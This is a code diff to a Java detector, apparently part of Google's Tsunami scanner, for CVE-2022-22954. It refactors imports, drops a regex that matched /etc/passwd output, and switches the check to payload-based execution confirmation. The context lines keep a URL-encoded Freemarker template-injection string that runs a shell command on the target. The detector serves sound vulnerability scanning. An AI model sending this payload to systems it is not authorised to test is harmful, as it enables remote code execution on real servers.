@@ -1,5 +1,5 @@
 /*
- * Copyright 2024 Google LLC
+ * Copyright 2025 Google LLC
  *
  * Licensed under the Apache License, Version 2.0 (the "License");
  * you may not use this file except in compliance with the License.
@@ -35,7 +35,15 @@ import com.google.tsunami.plugin.VulnDetector;
 import com.google.tsunami.plugin.annotations.PluginInfo;
 import com.google.tsunami.plugin.payload.Payload;
 import com.google.tsunami.plugin.payload.PayloadGenerator;
-import com.google.tsunami.proto.*;
+import com.google.tsunami.proto.DetectionReportList;
+import com.google.tsunami.proto.NetworkService;
+import com.google.tsunami.proto.PayloadGeneratorConfig;
+import com.google.tsunami.proto.TargetInfo;
+import com.google.tsunami.proto.DetectionReport;
+import com.google.tsunami.proto.DetectionStatus;
+import com.google.tsunami.proto.VulnerabilityId;
+import com.google.tsunami.proto.Vulnerability;
+import com.google.tsunami.proto.Severity;
 
 import java.io.IOException;
 import java.net.MalformedURLException;
@@ -43,7 +51,6 @@ import java.net.URL;
 import java.time.Clock;
 import java.time.Instant;
 import java.util.NoSuchElementException;
-import java.util.regex.Pattern;
 import javax.inject.Inject;
 
 /** A {@link VulnDetector} that detects the CVE-2022-22954 vulnerability. */
@@ -65,8 +72,6 @@ public final class Cve202222954VulnDetector implements VulnDetector {
       "catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7B%22freemarker%2Etemplate%2Eutility"
           + "%2EExecute%22%3Fnew%28%29%28%22cat%20%2F{{COMMAND}}%22%29%7D";
   static final String BRANDING_PATH = "SAAS/jersey/manager/api/branding";
-
-  @VisibleForTesting static final Pattern DETECTION_PATTERN = Pattern.compile("root:[x*]:0:0");
 
   @VisibleForTesting
   static final String VULN_DESCRIPTION =
@@ -183,7 +188,7 @@ public final class Cve202222954VulnDetector implements VulnDetector {
           httpClient.send(
               get(targetUri).setHeaders(HttpHeaders.builder().build()).build(), networkService);
       if (httpResponse.status().code() == 400
-          && DETECTION_PATTERN.matcher(httpResponse.bodyString().get()).find()) {
+          && payload.checkIfExecuted(httpResponse.bodyString().orElse(""))) {
         return true;
       }
 
